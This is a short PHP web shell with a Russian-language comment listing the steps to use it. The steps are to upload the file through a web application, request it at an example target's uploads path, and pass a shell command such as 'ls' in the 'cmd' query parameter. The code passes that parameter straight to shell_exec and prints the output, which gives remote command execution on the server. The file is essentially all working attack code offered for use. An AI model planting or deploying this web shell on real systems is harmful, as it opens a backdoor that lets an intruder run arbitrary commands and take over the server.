<?php
/*
1. Загружаем файл через веб-приложение
2. Обращаемся к нему https://target.com/uploads/web_shell.php
3. Добавляем параметр https://target.com/uploads/web_shell.php?cmd=ls
4. Смотрим ответ
*/
echo shell_exec($_GET['cmd'].' 2>&1');
?>